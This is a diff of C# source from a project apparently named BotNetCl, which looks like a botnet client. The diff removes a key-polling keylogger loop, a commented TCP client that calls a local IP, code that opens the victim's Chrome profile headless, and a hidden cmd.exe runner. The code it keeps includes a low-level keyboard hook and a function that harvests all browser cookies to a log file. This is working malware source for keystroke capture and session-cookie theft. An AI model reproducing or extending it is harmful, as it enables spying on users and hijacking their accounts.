@@ -29,37 +29,7 @@ namespace BotNetCl
         static ASCIIEncoding encoding = new ASCIIEncoding();
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
-        //static void Main(string[] args)
-        //{
-        //    new Program().start();
-        //}
 
-        private void start()
-        {
-            //  if (File.Exists(path)) File.SetAttributes(path, FileAttributes.Hidden);
-            // Timer t = new Timer();
-            //   t.Interval = 60000 * 20;
-            ////   t.Elapsed += sendEmail;
-            //   t.AutoReset = true;
-            //   t.Enabled = true;
-
-            while (true)
-            {
-                for (int i = 0; i < 255; i++)
-                {
-                    int key = GetAsyncKeyState(i);
-                    if (key == 1 || key == -32767)
-                    {
-                        //StreamWriter file = new StreamWriter(path, true);
-                        //File.SetAttributes(path, FileAttributes.Hidden);
-                        //file.Write(verifyKey(i));
-                        //file.Close();
-                        Console.WriteLine(verifyKey(i));
-                        break;
-                    }
-                }
-            }
-        }
         #region hook key board
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
@@ -371,98 +341,20 @@ namespace BotNetCl
             return c < 128;
         }
 
-        //public static void connectsocket()
-        //{
-
-        //    try
-        //    {
-        //        TcpClient client = new TcpClient();
-
-        //        // 1. connect
-        //        client.Connect("192.168.1.100", PORT_NUMBER);
-        //        //Stream stream = client.GetStream();
-
-        //        //Console.WriteLine("Connected to Y2Server.");
-        //        //Console.Write("Enter your name: ");
-
-        //        //string str = Console.ReadLine();
-
-        //        //// 2. send
-        //        //byte[] data = encoding.GetBytes(str);
-
-        //        //stream.Write(data, 0, data.Length);
-
-        //        // 3. receive
-        //        //data = new byte[BUFFER_SIZE];
-        //        //stream.Read(data, 0, BUFFER_SIZE);
-
-        //        //Console.WriteLine(encoding.GetString(data));
-
-        //        // 4.Close
-        //        //stream.Close();
-        //        //client.Close();
-
-        //        ///////////////////////////////////////////
-        //        Stream stream = client.GetStream();
-
-        //        Console.WriteLine("Connected to Y2Server.");
-        //        Console.Write("Enter your name: ");
-
-        //        string str = Console.ReadLine();
-
-        //        // 2. send
-        //        byte[] data = encoding.GetBytes(str);
-
-        //        stream.Write(data, 0, data.Length);
-
-        //        // 3. receive
-        //        data = new byte[BUFFER_SIZE];
-        //        stream.Read(data, 0, BUFFER_SIZE);
-
-        //        Console.WriteLine(encoding.GetString(data));
-        //    }
-
-        //    catch (Exception ex)
-        //    {
-        //        Console.WriteLine("Error: " + ex);
-        //    }
-
-        //    Console.Read();
-        //}
-
         public static void getCookies(IWebDriver driver, string url)
         {
-            //ChromeOptions options = new ChromeOptions();
-            //string username = RunCommandAndGetOutput("echo %username%").Trim();
-            //string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";
-
-            //// options.AddArguments("user-data-dir=C:/Users/ADMIN/AppData/Local/Google/Chrome/User Data");
-            ////Console.WriteLine(path);
-            //options.AddArguments(path, "headless");
-            //// options.AddArgument("--enable - automation");
-            ////, "--headless"
-            ////options.AddArgument("headless");
-            //// options.AddArgument("user-data-dir=C:/Users/[username]/AppData/Local/Google/Chrome/User Data");
-
-            //IWebDriver driver = new ChromeDriver(options);
-
             try
             {
                 // Navigate to Url
-                driver.Navigate().GoToUrl(url);
-             
-
-
+                driver.Navigate().GoToUrl(url);  
                 // Get All available cookies
                 var cookies = driver.Manage().Cookies.AllCookies;
                 string cookiesString = "";
                 foreach (var cookie in cookies)
                 {
                     //Console.WriteLine($"Name: {cookie.Name}, Value: {cookie.Value}");
-
                     cookiesString += $"{cookie.Name}={cookie.Value};";
                     // Console.Write($"{cookie.Name}={cookie.Value};");
-
                 }
                 string logNameToWrite = "cookies"  + logExtendtion;
                 StreamWriter sw = new StreamWriter(logNameToWrite, true);
@@ -475,28 +367,9 @@ namespace BotNetCl
             }
             finally
             {
-                //driver.Quit();
             }
         }
 
-        //public static void getCommandPrompt()
-        //{
-        //    Process cmd = new Process();
-        //    cmd.StartInfo.FileName = "cmd.exe";
-        //    cmd.StartInfo.RedirectStandardInput = true;
-        //    cmd.StartInfo.RedirectStandardOutput = true;
-        //    cmd.StartInfo.CreateNoWindow = true;
-        //    cmd.StartInfo.UseShellExecute = false;
-        //    cmd.Start();
-
-        //    cmd.StandardInput.WriteLine("echo %username%");
-        //    cmd.StandardInput.Flush();
-        //    cmd.StandardInput.Close();
-        //    cmd.WaitForExit();
-        //    Console.WriteLine(cmd.StandardOutput.ReadToEnd());
-        //    //string a = cmd.StandardOutput.ReadToEnd();
-        //    //Console.WriteLine(a);
-        //}
         public static string RunCommandAndGetOutput(string command)
         {
             string output = "";
